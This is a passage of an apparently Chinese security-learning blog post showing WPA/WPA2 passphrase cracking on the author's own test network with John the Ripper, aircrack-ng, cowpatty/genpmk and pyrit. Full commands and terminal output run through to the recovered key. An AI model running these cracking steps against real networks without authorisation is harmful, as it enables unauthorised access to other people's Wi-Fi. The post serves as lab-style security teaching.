+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base.txt --rules --stdout | wc -</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">440044p 0:00:00:00 100.00% (2018-02-10 11:21) 453653p/s 13475699999</span><br><span class="line"> 440044  440044 5280352</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base.txt --rules --stdout</span><br><span class="line">..........</span><br><span class="line">13475679999</span><br><span class="line">13475699999</span><br><span class="line">440044p 0:00:00:11 100.00% (2018-02-10 11:20) 39219p/s 13475699999</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>破解调用</p>
+<ul>
+<li><code>john --wordlist=base.txt --rules --stdout | aircrack-ng -e D-Link_DIR-612 -w - wpa.cap</code></li>
+<li>-e指定ESSID（若只有一个不需要指定），-w指定字典，-是指前面的标准输出stdout</li>
+</ul>
+</li>
+<li><p>实际测试</p>
+<ul>
+<li><p>测试用的无线网络密码是12341234，重新指定一个基础密码文件base1.txt，内容为1234，规则不变，这样总会生成12341234的密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base1.txt --rules --stdout | grep 12341234</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">12341234</span><br><span class="line">10001p 0:00:00:00 100.00% (2018-02-10 11:32) 25002p/s 12349999</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开始破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base1.txt --rules --stdout | aircrack-ng -e D-Link_DIR-612 -w - test.cap</span><br><span class="line">Opening test.cap</span><br><span class="line">Opening test.cap please wait...</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line"></span><br><span class="line">                                 Aircrack-ng 1.2 rc4</span><br><span class="line">                   [00:00:04] 1244 keys tested (258.73 k/s) </span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 12341234 ]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这种情况下要-e指定essid，否则失败</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# john --wordlist=base1.txt --rules --stdout | aircrack-ng -w - test.cap</span><br><span class="line">Please specify an ESSID or BSSID.</span><br><span class="line"></span><br><span class="line">Quitting aircrack-ng...</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-3-cowpatty"><a href="#3-3-cowpatty" class="headerlink" title="3.3-cowpatty"></a>3.3-cowpatty</h2><h3 id="（1）简介-2"><a href="#（1）简介-2" class="headerlink" title="（1）简介"></a>（1）简介</h3><ul>
+<li>WPA密码通用破解工具，跨平台的</li>
+<li>两种破解思路<ul>
+<li>思路1：密码字典破解，同aircrack需要一个字典文件</li>
+<li>思路2：使用彩虹表破解，类似airolib生成的PMK（只不过后者PMK是保存在数据库中，aircrack破解时从数据库调取，而前者是保存在文件，cowpatty破解时从本地文件调入）</li>
+</ul>
+</li>
+<li>此工具的优势在于彩虹表方式，提前生成彩虹表，为以后的破解做准备</li>
+<li>适用场景<ul>
+<li>生成彩虹表的时间与直接使用字典破解的方式，时间是差不多的（genpmk和aircrack相比）</li>
+<li>使用彩虹表，这种场景适用于破解同一个无线网络，只要其不改ESSID，但频繁改密码，则第一次生成彩虹表后，以后不论其如何更改密码，cowpatty破解即可，速度快</li>
+<li>如果改了ESSID，则彩虹表作废，又得重新生成，还得浪费时间</li>
+</ul>
+</li>
+</ul>
+<p>###（2）实例演示</p>
+<ul>
+<li><p>方式1：使用密码字典</p>
+<ul>
+<li><p><code>cowpatty -r test.cap -f dic.txt -s D-Link_DIR-612</code></p>
+</li>
+<li><p><code>-f指定密码文件，-s指定ESSID名称,-r指定待破解数据包</code></p>
+</li>
+<li><p>同aircrack破解思路是相同的，都需要一个字典文件</p>
+</li>
+<li><p>速度上不如aircrack快，这种方式不是其优势所在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cowpatty -r test.cap -f dic.txt -s D-Link_DIR-612</span><br><span class="line">cowpatty 4.6 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line"></span><br><span class="line">Collected all necessary data to mount crack against WPA2/PSK passphrase.</span><br><span class="line">Starting dictionary attack.  Please be patient.</span><br><span class="line"></span><br><span class="line">The PSK is &quot;12341234&quot;.</span><br><span class="line"></span><br><span class="line">3 passphrases tested in 0.03 seconds:  88.03 passphrases/second</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>方式2：使用彩虹表</p>
+<ol>
+<li><code>genpmk -f dic.txt -d pmkhash -s D-Link_DIR-612</code><ul>
+<li>需要使用到另一个工具，-f指定密码文件，-s指定ESSID，-d指定输出的文件</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">- 先根据密码字典生成彩虹表，即PMK集合</span><br><span class="line"></span><br><span class="line">   ```shell</span><br><span class="line">   root@kali:~# genpmk -f dic.txt -d pmkhash -s D-Link_DIR-612</span><br><span class="line">   genpmk 1.1 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line">   File pmkhash does not exist, creating.</span><br><span class="line">   key no. 1000: 65764764123123124124</span><br><span class="line">   key no. 2000: 54234545</span><br><span class="line">   key no. 3000: 12341234</span><br><span class="line">   key no. 4000: 12121212</span><br><span class="line">   key no. 5000: 233434545</span><br><span class="line">   key no. 6000: 34534534</span><br><span class="line">   key no. 7000: 65745745</span><br><span class="line">   key no. 8000: 45748478</span><br><span class="line">   key no. 9000: 45634253</span><br><span class="line">   key no. 10000: 65764764123123124124</span><br><span class="line">   key no. 11000: 54234545</span><br><span class="line"></span><br><span class="line">   11080 passphrases tested in 111.46 seconds:  99.41 passphrases/second</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>类似airolib，只不过计算出来的PMK集合是保存在本地文件，而非数据库</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ls pmkhash </span><br><span class="line">pmkhash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>生成的彩虹表文件是加密的，cat查看乱码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. `cowpatty -r test.cap -d pmkhash -s D-Link_DIR-612`</span><br><span class="line"></span><br><span class="line">   - 有彩虹表后，调用cowpatty来进行密码破解</span><br><span class="line"></span><br><span class="line">   - 破解速度很快，这才是其优势之所在</span><br></pre></td></tr></table></figure>
+<p>  root@kali:~# cowpatty -r test.cap -d pmkhash -s D-Link_DIR-612<br>  cowpatty 4.6 - WPA-PSK dictionary attack. <a href="mailto:&#106;&#119;&#x72;&#105;&#x67;&#104;&#116;&#x40;&#104;&#97;&#x73;&#x62;&#x6f;&#x72;&#x67;&#x2e;&#99;&#111;&#109;" target="_blank" rel="noopener">&#106;&#119;&#x72;&#105;&#x67;&#104;&#116;&#x40;&#104;&#97;&#x73;&#x62;&#x6f;&#x72;&#x67;&#x2e;&#99;&#111;&#109;</a></p>
+<p>  Collected all necessary data to mount crack against WPA2/PSK passphrase.<br>  Starting dictionary attack.  Please be patient.</p>
+<p>  The PSK is “12341234”.</p>
+<p>  3 passphrases tested in 0.00 seconds:  21428.57 passphrases/second</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 3.4-pyrit</span><br><span class="line"></span><br><span class="line">### （1）简介</span><br><span class="line"></span><br><span class="line">- GPU相关</span><br><span class="line">  - 除了利用CPU，还可以利用GPU，图形显卡中</span><br><span class="line">  - GPU计算能力很强大，不亚于CPU，甚至在其之上</span><br><span class="line">  - CPU在8核、16核这种量级，而GPU在千核级别</span><br><span class="line">  - GPU用途：处理图形流、大量的数学计算、密码破解</span><br><span class="line">  - 若GPU运用得当，可以很好的提高效率</span><br><span class="line">- airolib、cowpatty都要先计算彩虹表，而这一过程二者都是无法提高效率的，都要按部就班，没有提升空间，</span><br><span class="line">- 除非彩虹表重复利用，否则还不如直接用aircrack效率高</span><br><span class="line">- 与airolib、cowpatty相同，支持基于预计算的PMK提高破解速度</span><br><span class="line">- pyrit也是需要提前生成PMK，但可以使用GPU，以此来提高效率</span><br><span class="line">- 独有的优势</span><br><span class="line">  - 除CPU之外pyrit可以运用GPU的强大运算能力加速生成PMK</span><br><span class="line">  - 本身支持抓包获取四步握手过程，无需用airodum抓包</span><br><span class="line">  - 也支持传统的读取airodump抓包获取四步握手的方式</span><br><span class="line">- 两种数据包来源</span><br><span class="line">  - pyrit自身支持抓包</span><br><span class="line">  - 也可以使用airodump抓的包</span><br><span class="line">- 支持两种破解模式</span><br><span class="line">  - 密码字典破解</span><br><span class="line">  - 数据库模式（即利用提前生成的PMK）</span><br><span class="line"></span><br><span class="line">### （2）抓包相关</span><br><span class="line"></span><br><span class="line">- pyrit抓包</span><br><span class="line"></span><br><span class="line">  - 只是抓取WPA四次握手的数据包，剔除其它无用的数据，这样物理空间占用的少</span><br><span class="line">  - `pyrit -r wlan2mon -o wpapyrit.cap striplive`</span><br><span class="line">    - -r，指定开启monitor模式的网卡</span><br><span class="line">    - -o，抓取的数据包保存到本地</span><br><span class="line">    - striplive，把不需要的包剔除掉，只留下握手包）</span><br><span class="line">  - wpapyrit.cap是pyrot抓取的数据包，与airodump抓到的数据包格式是不同的，同样可以拿来破解密码，但是使用的参数是不同的，</span><br><span class="line">  - `pyrit -r wpapyrit.cap analyze`（分析数据包）</span><br><span class="line"></span><br><span class="line">- 导入airodump抓取的包</span><br><span class="line"></span><br><span class="line">  - airodump抓到的包给pyrit使用的话，要先进行格式转换</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
+<p> pyrit -r wpa.cap -o wpapyrit.cap strip</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    - stip提出掉没有用的包，只留下握手相关的包</span><br><span class="line">    - -r，指定airodump抓的包</span><br><span class="line">    - -o，格式转换后保存到本地的包</span><br><span class="line"></span><br><span class="line">  - 也可以analyse进行分析</span><br><span class="line"></span><br><span class="line">### （3）破解相关</span><br><span class="line"></span><br><span class="line">- 使用密码字典直接破解</span><br><span class="line"></span><br><span class="line">  - `pyrit -r wpapyrit.cap -i password.lst -b &lt;AP MAC&gt; attack_passthrough`</span><br><span class="line">  - attack_passthrough 是参数，表示直接进行密码破解</span><br><span class="line">  - 破解速度比cowpatty好点，但是比crack差</span><br><span class="line">  - 但用密码字典这种方式破解，还是首推crack</span><br><span class="line"></span><br><span class="line">- 数据库模式破解</span><br><span class="line"></span><br><span class="line">  - 默认使用基于文件的数据库，支持连接sql数据库（MySQL等），将计算的PMK存入数据库</span><br><span class="line"></span><br><span class="line">  - 查看默认数据库状态：`pyrit eval`（数据库是否连接、可用的密码个数等）</span><br><span class="line"></span><br><span class="line">  - 导入密码字典：`pyrit -i password.lst import_passwords`（也会自动剔除不合格密码）</span><br><span class="line"></span><br><span class="line">  - 指定ESSID： `pyrit -e kifi create_essid`</span><br><span class="line"></span><br><span class="line">  - 计算PMK：</span><br></pre></td></tr></table></figure>
+<p> pyrit batch</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  （发挥GPU计算能力）</span><br><span class="line"></span><br><span class="line">  - 虚拟机没有GPU可言，发挥不出pyrit该有优势</span><br><span class="line">  - 若硬件满足条件，存在GPU，效率是很高的（也取决于显卡好坏</span><br><span class="line">  - 计算后的PMK存储在数据库后，就可以进行后续破解</span><br><span class="line"></span><br><span class="line">- 破解密码：</span><br></pre></td></tr></table></figure>
+<p> pyrit -r wpapyrit.cap -b <ap mac> attack_db</ap></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    - 参数attack-db，表示从数据库中导入PMK，进行破解</span><br><span class="line">    - 若数据包中只有一个待破解AP，不需要-b指定其MAC地址</span><br><span class="line"></span><br><span class="line">  - pyrit可以连接到数据库，如mysql，日后破解时，直接从数据库中调取（可以创建一个专门用于密码破解的数据库）</span><br><span class="line"></span><br><span class="line">### （4）实例演示</span><br><span class="line"></span><br><span class="line">&gt; 若采用密码字典的方式，还是首推aircrack，不再演示此方式</span><br><span class="line">&gt;</span><br><span class="line">&gt; 以数据库模式的破解为例，即提前生成PMK的方式</span><br><span class="line"></span><br><span class="line">1. `pyrit -e D-Link_DIR-612 create_essid`，指定ESSID</span><br></pre></td></tr></table></figure>
+<p>root@kali:~# pyrit -e D-Link_DIR-612 create_essid<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
+<p>Connecting to storage at ‘file://‘…  connected.<br>Created ESSID ‘D-Link_DIR-612’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. `pyrit -i dic.txt import_passwords`，导入密码文件</span><br></pre></td></tr></table></figure>
+<p>root@kali:~# pyrit -i dic.txt import_passwords<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
+<p>Connecting to storage at ‘file://‘…  connected.<br>11080 lines read. Flushing buffers…<br>All done.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. `pyrit eval`，查看数据库状态，看当前的ESSID、可用的password</span><br></pre></td></tr></table></figure>
+<p>root@kali:~# pyrit eval<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
+<p>Connecting to storage at ‘file://‘…  connected.<br>Passwords available: 11</p>
+<p>ESSID ‘D-Link_DIR-612’ : 0 (0.00%)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. `pyrit batch`，计算PMK</span><br></pre></td></tr></table></figure>
+<p>root@kali:~# pyrit batch<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
+<p>Connecting to storage at ‘file://‘…  connected.<br>Working on ESSID ‘D-Link_DIR-612’<br>Processed all workunits for ESSID ‘D-Link_DIR-612’; 17 PMKs per second.</p>
+<p>Batchprocessing done.<br>root@kali:~# </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5. `pyrit -r test.cap attack_db` ，开始破解</span><br></pre></td></tr></table></figure>
+<p>root@kali:~# pyrit -r test.cap attack_db<br>Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora<br><a href="https://github.com/JPaulMora/Pyrit" target="_blank" rel="noopener">https://github.com/JPaulMora/Pyrit</a><br>This code is distributed under the GNU General Public License v3+</p>
+<p>Connecting to storage at ‘file://‘…  connected.<br>Parsing file ‘test.cap’ (1/1)…<br>Parsed 3118 packets (3118 802.11-packets), got 1 AP(s)</p>
+<p>Picked AccessPoint c4:a8:1d:e1:65:f8 (‘D-Link_DIR-612’) automatically.<br>Attacking handshake with Station 70:f0:87:7f:2b:91…<br>Tried 7 PMKs so far (63.6%); 1737 PMKs per second.</p>
+<p>The password is ‘12341234’.<br><code>`</code></p>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Kali/" rel="tag"># Kali</a>
+          
+            <a href="/tags/无线攻击/" rel="tag"># 无线攻击</a>
+          
+            <a href="/tags/Tool/" rel="tag"># Tool</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/18/服务器相关安全设置/" rel="next" title="服务器相关安全设置">
+                <i class="fa fa-chevron-left"></i> 服务器相关安全设置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/18/WPS攻击/" rel="prev" title="WPS攻击">
+                WPS攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#01-姿势一：普通的WPA破解"><span class="nav-text">01-姿势一：普通的WPA破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-简介"><span class="nav-text">1.1-简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-破解过程"><span class="nav-text">1.2-破解过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#02-姿势二：无AP的WPA破解"><span class="nav-text">02-姿势二：无AP的WPA破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-简介"><span class="nav-text">2.1-简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-攻击原理"><span class="nav-text">2.2-攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-破解过程"><span class="nav-text">2.3-破解过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-其它"><span class="nav-text">2.4-其它</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#03-其它工具"><span class="nav-text">03-其它工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-airolib"><span class="nav-text">3.1-airolib</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（1）简介"><span class="nav-text">（1）简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（2）实例演示"><span class="nav-text">（2）实例演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-JTR（john）"><span class="nav-text">3.2-JTR（john）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（1）简介-1"><span class="nav-text">（1）简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#（2）实例演示-1"><span class="nav-text">（2）实例演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-cowpatty"><span class="nav-text">3.3-cowpatty</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#（1）简介-2"><span class="nav-text">（1）简介</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
